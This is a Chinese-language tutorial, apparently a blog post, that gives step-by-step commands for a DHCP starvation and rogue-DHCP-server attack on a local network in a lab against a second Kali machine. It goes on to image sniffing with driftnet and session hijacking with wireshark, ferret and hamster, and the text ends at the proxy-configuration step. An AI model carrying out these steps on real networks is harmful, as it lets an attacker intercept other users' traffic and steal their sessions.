通常内网渗透都是基于ARP的攻击，但ARP攻击对内网的负担太重，很容易被发现。今天讲的是基于DHCP协议的攻击。 

基于DHCP的攻击理解起来很简单，首先伪造Mac地址耗竭正常的DHCP服务器的IP地址，然后黑客用自己的主机伪造一个DHCP服务器，那么新连上内网的主机只能使用流氓DHCP服务器分配的IP，这样黑客的主机就变成了内网网关，可以借此控制内网中其他主机的网络流量。  

攻击环境

操作系统:Kali linux

网关: 192.168.177.1

IP地址: 192.168.177.128

网段:192.168.177.1/24

![](../Images/94519a9c9c59141e7e5f701e7b89d408.png)

0×01 开启操作系统的路由转发

```
echo "1" >/proc/sys/net/ipv4/ip\_forward
```

0×02 攻击正常的dhcp服务器，耗光ip资源

```
dhcpstarv -i eth0 -e 192.168.177.128
```

![](../Images/63ed63a7af2fe7fcbb5c2f20e74b074d.png "003.png")

Kali默认没有安装dhcpstarv，也可以用yersinia代替

0×03 安装dhcp服务器udhcpd

```
\# apt-get install udhcpd
```

然后修改一下配置文件

```
＃ vim /etc/udhcpd.conf
```

![](../Images/bce802fc18767f1c039b1706d251343f.png "004.png")

![](../Images/63132d5a8992ccdab69772e75582435f.png "004-2.png")

0×04 启动DHCP服务器

```
service udhcpd start
```

![](../Images/b8eba1864590f9e344911bdd8be3b671.png)

然后启动另一台Kali机当作目标靶机，由于正常的DHCP服务器已经没有可分配的IP资源，新的内网主机就会使用攻击者DHCP服务器分配的IP

![](../Images/0092cc3353c1e9b5db3a27ff06dc3eb6.png "007.png")

0×05 抓取目标靶机的图片  
在攻击主机上开启driftnet  

```
\# driftnet -i eth0
```

在目标靶机打开百度图片

![](../Images/9b9fa391129589d28edf7e226c23f381.png "008.png")

在攻击者的服务器上就可以看到图像

![](../Images/44ce9a6279a9c76070a52ca8b5c5c4a7.png)

0×06 会话劫持

开启wireshark抓取流经本地网卡的数据包，由于其他的机器走的是攻击者主机的网卡，这也意味着wireshark可以抓取其他主机的数据包

![](../Images/3193f98652a10e653ee23784acd7fcf4.png)

用ferret解析一下

```
\# ferret -r demo.pcap
```

![](../Images/ba4207e8dcb29b62d073e8f4a587950c.png)

会在本地生成一个名为hamster.txt的文件

![](../Images/91b836db26d34b4b5ccd23c2ab957e01.png)

然后运行harmter,这会在主机开启1234端口

![](../Images/00bd3cead0025a722669215d88d72088.png)

配置一下火狐代理

![](../Images/939a957cb7a91c01ae6e6c1788281e58.png)
